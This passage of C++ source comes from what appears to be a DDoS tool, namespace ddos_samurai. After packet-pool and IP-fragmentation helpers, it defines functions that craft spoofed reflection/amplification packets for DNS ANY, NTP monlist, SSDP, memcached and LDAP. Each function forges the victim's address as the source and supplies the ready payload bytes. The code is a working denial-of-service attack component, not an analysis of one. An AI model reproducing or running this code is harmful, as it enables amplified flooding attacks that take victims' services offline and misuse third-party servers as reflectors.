    packets.push_back(std::move(pkt));
  }

  if (!uniform_size) {
    size_t total = 0;
    for (const auto& pkt : packets) total += pkt.size();
    storage->reserve(total);
    for (const auto& pkt : packets) storage->insert(storage->end(), pkt.begin(), pkt.end());
    return {storage, 0};
  }

  storage->assign(static_cast<size_t>(count) * pkt_size, 0);
  for (int i = 0; i < count; ++i) {
    std::copy(packets[static_cast<size_t>(i)].begin(),
              packets[static_cast<size_t>(i)].end(),
              storage->begin() + static_cast<ptrdiff_t>(static_cast<size_t>(i) * pkt_size));
  }
  return {storage, pkt_size};
}

PacketPoolBuffer generate_packet_pool_view(const PacketConfig& cfg,
                                           int count,
                                           bool uniform_size,
                                           bool low_peak_memory) {
  auto [storage, pkt_size] = generate_packet_pool_impl(cfg, count, uniform_size, low_peak_memory);
  return PacketPoolBuffer(storage, pkt_size);
}

std::pair<std::vector<uint8_t>, size_t> generate_packet_pool(const PacketConfig& cfg,
                                                             int count,
                                                             bool uniform_size,
                                                             bool low_peak_memory) {
  auto [storage, pkt_size] = generate_packet_pool_impl(cfg, count, uniform_size, low_peak_memory);
  return {*storage, pkt_size};
}

std::vector<std::vector<uint8_t>> fragment_packet(const std::vector<uint8_t>& packet, int fragment_size) {
  if (packet.size() < 20) return {packet};

  const int ihl = (packet[0] & 0x0F) * 4;
  const size_t total_len = std::min<size_t>(read_be16(packet.data() + 2), packet.size());
  if (total_len <= static_cast<size_t>(ihl)) {
    return {std::vector<uint8_t>(packet.begin(), packet.begin() + ihl)};
  }

  const std::vector<uint8_t> ip_header(packet.begin(), packet.begin() + ihl);
  const std::vector<uint8_t> payload(packet.begin() + ihl, packet.begin() + total_len);
  if (static_cast<int>(payload.size()) <= fragment_size) {
    return {std::vector<uint8_t>(packet.begin(), packet.begin() + total_len)};
  }

  fragment_size = std::max(8, (fragment_size / 8) * 8);
  const uint16_t base_flags_frag = read_be16(packet.data() + 6);
  const uint16_t base_offset = static_cast<uint16_t>(base_flags_frag & 0x1FFFu);
  const uint16_t preserved_flags = static_cast<uint16_t>(base_flags_frag & 0xC000u);

  std::vector<std::vector<uint8_t>> frags;
  for (size_t offset = 0; offset < payload.size(); offset += static_cast<size_t>(fragment_size)) {
    const size_t chunk_len = std::min(static_cast<size_t>(fragment_size), payload.size() - offset);
    const bool is_last = (offset + chunk_len) >= payload.size();
    std::vector<uint8_t> frag = ip_header;
    const uint16_t flags = static_cast<uint16_t>(preserved_flags | (is_last ? 0 : 0x2000u) | (base_offset + (offset / 8u)));
    write_be16(frag, 6, flags);
    write_be16(frag, 2, static_cast<uint16_t>(ihl + chunk_len));
    write_be16(frag, 10, 0);
    write_be16(frag, 10, checksum(frag.data(), frag.size()));
    frag.insert(frag.end(),
                payload.begin() + static_cast<ptrdiff_t>(offset),
                payload.begin() + static_cast<ptrdiff_t>(offset + chunk_len));
    frags.push_back(std::move(frag));
  }
  return frags;
}

std::vector<uint8_t> add_ethernet_frame(const std::vector<uint8_t>& ip_packet,
                                        const std::vector<uint8_t>& dst_mac,
                                        const std::vector<uint8_t>& src_mac) {
  auto eth = build_ethernet_header(dst_mac, src_mac, ETHERTYPE_IPV4);
  eth.insert(eth.end(), ip_packet.begin(), ip_packet.end());
  return eth;
}

std::vector<uint8_t> create_dns_amp_packet(const std::string& reflector_ip,
                                           const std::string& victim_ip,
                                           const std::string& dns_name) {
  const auto payload = build_dns_query(dns_name, "ANY", true, true, 0);
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    53,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_ntp_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const std::vector<uint8_t> payload = {0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00};
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    123,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_ssdp_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const auto payload = bytes_from_string(
      "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n");
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    1900,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_memcached_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const std::vector<uint8_t> payload = {0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                                        's',  't',  'a',  't',  's',  '\r', '\n'};
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    11211,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<uint8_t> create_ldap_amp_packet(const std::string& reflector_ip, const std::string& victim_ip) {
  const std::vector<uint8_t> payload = {
      0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00, 0x0a,
      0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00, 0x87, 0x0b,
      0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00,
  };
  const auto udp = build_udp_header(rand_int(1025, 65534),
                                    389,
                                    payload,
                                    static_cast<uint32_t>(ip_to_int(victim_ip)),
                                    static_cast<uint32_t>(ip_to_int(reflector_ip)),
                                    true);
  auto ip = build_ipv4_header(victim_ip, reflector_ip, PROTO_UDP, static_cast<int>(udp.size() + payload.size()), 64, 0, 0, 0x4000, {});
  ip.insert(ip.end(), udp.begin(), udp.end());
  ip.insert(ip.end(), payload.begin(), payload.end());
  return ip;
}

std::vector<OSProfile> os_profiles() { return profiles_ref(); }

}  // namespace ddos_samurai::cpu_native
